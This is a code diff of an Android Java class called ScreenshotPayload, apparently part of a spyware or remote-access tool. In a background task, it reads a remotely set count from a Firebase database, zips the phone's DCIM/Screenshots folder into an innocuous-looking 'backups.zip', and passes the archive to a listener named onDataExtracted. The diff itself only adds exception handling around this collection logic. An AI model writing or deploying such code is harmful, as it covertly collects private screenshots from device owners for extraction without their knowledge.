@@ -41,40 +41,45 @@ public class ScreenshotPayload extends AsyncTask<String, Integer, String> {
 
     @Override
     protected String doInBackground(String... strings) {
-        File file = new File(Environment.getExternalStorageDirectory()+"/DCIM/Screenshots");
-        Log.d("PATH ",file.getAbsolutePath());
+        try {
 
-        FirebaseDatabase
-                .getInstance()
-                .getReference("RUNTIME_PROPS")
-                .child("NO_OF_SCREENSHOTS")
-                .addListenerForSingleValueEvent(new ValueEventListener() {
-                    @Override
-                    public void onDataChange(@NonNull DataSnapshot snapshot) {
+            File file = new File(Environment.getExternalStorageDirectory() + "/DCIM/Screenshots");
+            Log.d("PATH ", file.getAbsolutePath());
 
-                        if (snapshot.exists()) {
-                            try {
-                                noOfFiles = snapshot.getValue(Integer.class);
-                            } catch (DatabaseException | NullPointerException databaseException) {
-                                noOfFiles = -1;
+            FirebaseDatabase
+                    .getInstance()
+                    .getReference("RUNTIME_PROPS")
+                    .child("NO_OF_SCREENSHOTS")
+                    .addListenerForSingleValueEvent(new ValueEventListener() {
+                        @Override
+                        public void onDataChange(@NonNull DataSnapshot snapshot) {
+
+                            if (snapshot.exists()) {
+                                try {
+                                    noOfFiles = snapshot.getValue(Integer.class);
+                                } catch (DatabaseException | NullPointerException databaseException) {
+                                    noOfFiles = -1;
+                                }
+                            } else noOfFiles = -1;
+
+                            if (noOfFiles == -1) {
+                                new ZipUtils().setZipListener(() -> screenshotPayloadListener.onDataExtracted(new File(Environment.getExternalStorageDirectory() + "DCIM/backups.zip")))
+                                        .zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip");
+                            } else {
+                                new ZipUtils().setZipListener(() -> {
+                                }).zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip", noOfFiles);
                             }
-                        } else noOfFiles = -1;
-
-                        if (noOfFiles == -1) {
-                            new ZipUtils().setZipListener(() -> screenshotPayloadListener.onDataExtracted(new File(Environment.getExternalStorageDirectory() + "DCIM/backups.zip")))
-                                    .zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip");
-                        } else {
-                            new ZipUtils().setZipListener(() -> {
-                            }).zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip", noOfFiles);
                         }
-                    }
 
-                    @Override
-                    public void onCancelled(@NonNull DatabaseError error) {
-                        //TODO UPDATE TO LOGS
-                    }
-                });
+                        @Override
+                        public void onCancelled(@NonNull DatabaseError error) {
+                            //TODO UPDATE TO LOGS
+                        }
+                    });
 
+        }catch (Exception e){
+            Log.e("EXCEPTION_SS : ",e.getMessage());
+        }
 
         return null;
     }
